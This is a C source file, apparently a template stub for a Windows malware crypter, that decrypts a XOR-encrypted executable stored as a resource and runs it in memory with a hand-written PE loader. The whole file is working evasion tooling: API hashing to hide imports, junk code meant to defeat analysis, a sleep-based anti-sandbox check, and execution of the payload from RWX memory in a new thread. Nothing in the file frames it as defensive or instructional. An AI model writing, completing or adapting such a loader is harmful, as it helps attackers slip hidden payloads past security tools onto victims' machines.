#include <windows.h>
#include <stdio.h>

// --- Config ---
#define IDR_PAYLOAD 101
unsigned char g_M[] = {{KEY}}; 

// --- Obfuscation Utils ---
// Simple XOR String (Compile-time if possible, but runtime here)
char* XStr(const char* s, int len) {
    char* d = (char*)malloc(len + 1);
    for(int i=0; i<len; i++) d[i] = s[i] ^ 0x55; // Key 0x55
    d[len] = 0;
    return d;
}

// API Hashing (Jenkins Hash)
DWORD Hash(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash += *str++;
        hash += (hash << 10);
        hash ^= (hash >> 6);
    }
    hash += (hash << 3);
    hash ^= (hash >> 11);
    hash += (hash << 15);
    return hash;
}

// Get Proc Address by Hash (No strings in Import Table)
FARPROC GetProcAddressByHash(HMODULE hMod, DWORD hHash) {
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)hMod + d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY e = (PIMAGE_EXPORT_DIRECTORY)((char*)hMod + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* names = (DWORD*)((char*)hMod + e->AddressOfNames);
    WORD* ordinals = (WORD*)((char*)hMod + e->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((char*)hMod + e->AddressOfFunctions);

    for (DWORD i = 0; i < e->NumberOfNames; i++) {
        char* name = (char*)hMod + names[i];
        if (Hash(name) == hHash) {
            return (FARPROC)((char*)hMod + funcs[ordinals[i]]);
        }
    }
    return NULL;
}

// Function Pointers
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);

// --- PE Loader (Dynamic) ---
void* LoadPE(void* p) {
    // Hashes for: VirtualAlloc, LoadLibraryA, GetProcAddress
    // Jenkins Hash values (pre-calculated or calculated)
    // VirtualAlloc: 0x382C0F97
    // LoadLibraryA: 0x5FBFF0FB
    // GetProcAddress: 0xCF31BB1E
    
    HMODULE hK = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddressByHash(hK, 0x382C0F97);
    pLoadLibraryA fnLoadLibraryA = (pLoadLibraryA)GetProcAddressByHash(hK, 0x5FBFF0FB);
    pGetProcAddress fnGetProcAddress = (pGetProcAddress)GetProcAddressByHash(hK, 0xCF31BB1E);

    if (!fnVirtualAlloc) return NULL; // Should not happen

    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)p;
    if (d->e_magic != 0x5A4D) return NULL;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)p + d->e_lfanew);

    void* b = fnVirtualAlloc(NULL, n->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!b) return NULL;

    memcpy(b, p, n->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(n);
    for (int i = 0; i < n->FileHeader.NumberOfSections; i++) {
        if (s->SizeOfRawData > 0) memcpy((char*)b + s->VirtualAddress, (char*)p + s->PointerToRawData, s->SizeOfRawData);
        s++;
    }

    // Relocations
    DWORD64 dlt = (DWORD64)b - n->OptionalHeader.ImageBase;
    if (dlt != 0 && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION r = (PIMAGE_BASE_RELOCATION)((char*)b + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (r->VirtualAddress) {
            DWORD c = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* l = (WORD*)(r + 1);
            for (DWORD i = 0; i < c; i++) if ((l[i] >> 12) == IMAGE_REL_BASED_DIR64) *(DWORD64*)((char*)b + r->VirtualAddress + (l[i] & 0xFFF)) += dlt;
            r = (PIMAGE_BASE_RELOCATION)((char*)r + r->SizeOfBlock);
        }
    }

    // Imports
    if (n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR im = (PIMAGE_IMPORT_DESCRIPTOR)((char*)b + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (im->Name) {
            HMODULE hM = fnLoadLibraryA((char*)b + im->Name);
            if (hM) {
                PIMAGE_THUNK_DATA t = (PIMAGE_THUNK_DATA)((char*)b + im->FirstThunk);
                PIMAGE_THUNK_DATA o = (PIMAGE_THUNK_DATA)((char*)b + (im->OriginalFirstThunk ? im->OriginalFirstThunk : im->FirstThunk));
                while (o->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(o->u1.Ordinal)) t->u1.Function = (DWORD64)fnGetProcAddress(hM, (char*)(o->u1.Ordinal & 0xFFFF));
                    else t->u1.Function = (DWORD64)fnGetProcAddress(hM, ((PIMAGE_IMPORT_BY_NAME)((char*)b + o->u1.AddressOfData))->Name);
                    t++; o++;
                }
            }
            im++;
        }
    }

    return b;
}

// --- Junk Code ---
void Junk() {
    volatile int x = 0;
    for (int i = 0; i < 10000; i++) {
        x += i ^ 0xDEADBEEF;
        if (x % 3 == 0) x = x >> 2;
    }
}

void Start() {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (!hRes) return;
    HGLOBAL hResData = LoadResource(NULL, hRes);
    void* pData = LockResource(hResData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    unsigned char* p = (unsigned char*)malloc(dwSize);
    memcpy(p, pData, dwSize);

    // Decrypt Payload (Simple XOR, but effective with dynamic key)
    int kl = sizeof(g_M);
    for (int i = 0; i < (int)dwSize; i++) p[i] = p[i] ^ g_M[i % kl] ^ (unsigned char)(i & 0xFF);

    Junk(); // Break analysis flow

    void* b = LoadPE(p);
    if (b) {
        PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)b;
        PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)b + d->e_lfanew);
        
        // Find Entry Point dynamically
        DWORD64 ep = (DWORD64)b + n->OptionalHeader.AddressOfEntryPoint;
        
        // Call via CreateThread to decouple stack
        HMODULE hK = GetModuleHandleA("kernel32.dll");
        pCreateThread fnCreateThread = (pCreateThread)GetProcAddressByHash(hK, 0x82962C80); // CreateThread Hash
        pWaitForSingleObject fnWait = (pWaitForSingleObject)GetProcAddressByHash(hK, 0x1BB3E776); // WaitForSingleObject Hash

        if(fnCreateThread && fnWait) {
            HANDLE hThread = fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
            if (hThread) fnWait(hThread, INFINITE);
        }
    }
}

int main() {
    // Anti-Sandbox: Sleep Check
    DWORD t1 = GetTickCount();
    Sleep(2500);
    DWORD t2 = GetTickCount();
    if ((t2 - t1) < 2000) return 0; // Time accelerated

    Junk();
    Start();
    return 0;
}
